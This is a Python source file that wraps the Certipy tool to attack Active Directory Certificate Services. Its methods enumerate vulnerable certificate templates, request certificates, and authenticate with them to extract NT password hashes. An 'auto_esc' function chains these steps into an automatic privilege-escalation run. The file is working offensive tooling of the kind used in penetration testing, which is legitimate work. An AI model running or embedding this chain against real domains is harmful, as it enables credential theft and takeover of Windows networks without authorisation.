import asyncio
import json
import os
import re
from typing import Optional

CERTIPY_BIN = os.getenv("CERTIPY_BIN", "certipy")


class CertipyWrapper:
    def __init__(self):
        self._available = False
        self._check_available()

    def _check_available(self):
        try:
            import subprocess
            r = subprocess.run([CERTIPY_BIN, "--help"], capture_output=True, text=True, timeout=5)
            self._available = r.returncode == 0
        except Exception:
            self._available = False

    @property
    def available(self) -> bool:
        return self._available

    async def find(self, target: str, user: str = "", password: str = "",
                   dc_ip: str = "", timeout: int = 120) -> dict:
        cmd = [CERTIPY_BIN, "find", "-target", target]
        if user:
            cmd.extend(["-u", f"{user}@{(dc_ip or target).split('.')[0]}"])
        if password:
            cmd.extend(["-p", password])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        cmd.extend(["-json", "-vulnerable"])

        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.PIPE, stderr=asyncio.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            return {"success": False, "error": "Certipy find timed out"}

        output = stdout.decode("utf-8", errors="replace")
        vulns = []
        for line in output.split("\n"):
            if "ESC" in line or "vulnerable" in line.lower() or "VERIFICATION" in output:
                vulns.append(line.strip())

        return {
            "success": proc.returncode == 0,
            "vulnerabilities": vulns,
            "raw": output[:5000],
            "error": stderr.decode("utf-8", errors="replace")[:1000] if proc.returncode != 0 else "",
        }

    async def req(self, target: str, ca: str, template: str = "",
                  user: str = "", password: str = "", dc_ip: str = "",
                  timeout: int = 120) -> dict:
        cmd = [CERTIPY_BIN, "req", f"-target", target, f"-ca", ca]
        if user:
            cmd.extend(["-u", user])
        if password:
            cmd.extend(["-p", password])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])
        if template:
            cmd.extend(["-template", template])

        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.PIPE, stderr=asyncio.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            return {"success": False, "error": "Certipy req timed out"}

        out = stdout.decode("utf-8", errors="replace")
        cert_match = re.search(r"Saved certificate to (.+\.pem)", out)
        return {
            "success": proc.returncode == 0,
            "certificate_path": cert_match.group(1) if cert_match else None,
            "output": out[:3000],
            "error": stderr.decode("utf-8", errors="replace")[:1000] if proc.returncode != 0 else "",
        }

    async def auth(self, pfx_path: str, domain: str, dc_ip: str = "",
                   timeout: int = 120) -> dict:
        cmd = [CERTIPY_BIN, "auth", "-pfx", pfx_path, "-domain", domain]
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.PIPE, stderr=asyncio.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.kill()
            return {"success": False, "error": "Certipy auth timed out"}

        out = stdout.decode("utf-8", errors="replace")
        nt_hash = re.search(r"Got Hash for '(.+)':([a-f0-9]{32})", out)
        return {
            "success": proc.returncode == 0,
            "nt_hash": nt_hash.group(2) if nt_hash else None,
            "user": nt_hash.group(1) if nt_hash else None,
            "output": out[:3000],
            "error": stderr.decode("utf-8", errors="replace")[:1000] if proc.returncode != 0 else "",
        }

    async def auto_esc(self, target: str, user: str, password: str,
                       dc_ip: str = "", timeout: int = 300) -> list[dict]:
        results = []
        find_result = await self.find(target, user=user, password=password, dc_ip=dc_ip, timeout=timeout)
        if not find_result["success"]:
            return [find_result]
        results.append(find_result)
        raw = find_result.get("raw", "")
        ca_match = re.search(r"CA Name\s+:\s+(.+)", raw)
        template_match = re.search(r"Template\s+:\s+(.+)", raw)
        if ca_match:
            ca_name = ca_match.group(1).strip()
            template = template_match.group(1).strip() if template_match else "User"
            req_result = await self.req(target, ca_name, template=template,
                                        user=user, password=password, dc_ip=dc_ip,
                                        timeout=timeout)
            results.append(req_result)
            if req_result.get("certificate_path") and os.path.exists(req_result["certificate_path"]):
                auth_result = await self.auth(req_result["certificate_path"],
                                              domain=target.split(".")[0],
                                              dc_ip=dc_ip, timeout=timeout)
                results.append(auth_result)
        return results
